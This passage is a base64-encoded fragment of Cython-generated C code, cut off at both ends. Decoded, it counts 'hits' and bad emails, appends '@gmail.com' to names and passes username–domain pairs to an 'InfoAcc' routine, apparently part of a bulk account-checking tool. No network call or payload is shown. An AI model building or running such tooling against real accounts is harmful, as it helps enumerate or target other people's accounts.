9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzNDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cywgX19weXhfdF8xMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzE0ID0gTlVMTDtcbiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcHBwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzQxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzE0KTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTQsIE5VTEx9O1xuICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM0MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjAsIF9fcHl4X3ZfZW1haWwsIFB5X05FKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzQyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fcHl4X3RfNCkge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF92X2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dtYWlsX2NvbV8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM0MywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fcHl4X3Zfb2sgPSBfX3B5eF90XzEwO1xuICAgICAgICAgIF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF81ID0gX19weXhfdl9vaztcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yMH07XG4gICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM0NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgfVxuICAgICAgICAgIGlmICgobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF90XzEwKSkpIHx8IChQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzEwKSkpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfMTA7XG4gICAgICAgICAgICBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeVNlcXVlbmNlX1NJWkUoc2VxdWVuY2UpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgIT0gMikpIHtcbiAgICAgICAgICAgICAgaWYgKHNpemUgPiAyKSBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcigyKTtcbiAgICAgICAgICAgICAgZWxzZSBpZiAoc2l6ZSA+PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3Ioc2l6ZSk7XG4gICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAzNDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChzZXF1ZW5jZSkpKSB7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDApO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xNCA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDM0NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDM0NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzQ0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzNDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeV9zc2l6ZV90IGluZGV4ID0gLTE7XG4gICAgICAgICAgICBfX3B5eF90XzYgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgICAgX19weXhfdF8xNyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfNSA9IF9fcHl4X3RfMTcoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBnb3RvIF9fcHl4X0wyMl91bnBhY2tpbmdfZmFpbGVkO1xuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfMTQgPSBfX3B5eF90XzE3KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIGdvdG8gX19weXhfTDIyX3VucGFja2luZ19mYWlsZWQ7XG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBpZiAoX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhfX3B5eF90XzE3KF9fcHl4X3RfNiksIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzQ0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0wyM191bnBhY2tpbmdfZG9uZTtcbiAgICAgICAgICAgIF9fcHl4X0wyMl91bnBhY2tpbmdfZmFpbGVkOjtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19weXhfdF8xNyA9IE5VTEw7XG4gICAgICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7XG4gICAgICAgICAgICBfX1BZWF9FUlIoMCwgMzQ0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fcHl4X0wyM191bnBhY2tpbmdfZG9uZTo7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3ZfdXNlcm5hbWUgPSBfX3B5eF90XzU7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF92X2dnID0gX19weXhfdF8xNDtcbiAgICAgICAgICBfX3B5eF90XzE0ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfMTQgPSBOVUxMO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDM0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDE7XG4gICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgICAgICAgX19weXhfdF8xNCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICBhc3NlcnQoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzE0LCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2dnfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgzLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBnb3RvIF9fcHl4X0wyMTtcbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3ZfZW1haWw7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjB9O1xuICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIH1cbiAgICAgICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCogc2VxdWVuY2UgPSBfX3B5eF90XzEwO1xuICAgICAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplICE9IDIpKSB7XG4gICAgICAgICAgICAgIGlmIChzaXplID4gMikgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoMik7XG4gICAgICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpO1xuICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkge1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAwKTtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoc2VxdWVuY2UsIDApO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMSk7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xO1xuICAgICAgICAgICAgX19weXhfdF82ID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF90XzEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzYpO1xuICAgICAgICAgICAgaW5kZXggPSAwOyBfX3B5eF90XzUgPSBfX3B5eF90XzE3KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MMjRfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgaW5kZXggPSAxOyBfX3B5eF90XzE0ID0gX19weXhfdF8xNyhfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBnb3RvIF9fcHl4X0wyNF91bnBhY2tpbmdfZmFpbGVkO1xuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzYpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX3B5eF90XzE3ID0gTlVMTDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgZ290byBfX3B5eF9MMjVfdW5wYWNraW5nX2RvbmU7XG4gICAgICAgICAgICBfX3B5eF9MMjRfdW5wYWNraW5nX2ZhaWxlZDo7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMO1xuICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJGaW5pc2goKSA9PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpO1xuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX3B5eF9MMjVfdW5wYWNraW5nX2RvbmU6O1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF92X3VzZXJuYW1lID0gX19weXhfdF81O1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdl9nZyA9IF9fcHl4X3RfMTQ7XG4gICAgICAgICAgX19weXhfdF8xNCA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzE0ID0gTlVMTDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHtcbiAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZ307XG4gICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMy1fX3B5eF90XzEzKSB8IChfX3B5eF90XzEzKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wyMTo7XG5cbiAgICAgICAgXG4gICAgICAgIGdvdG8gX19weXhfTDIwO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZGVtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM1MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5s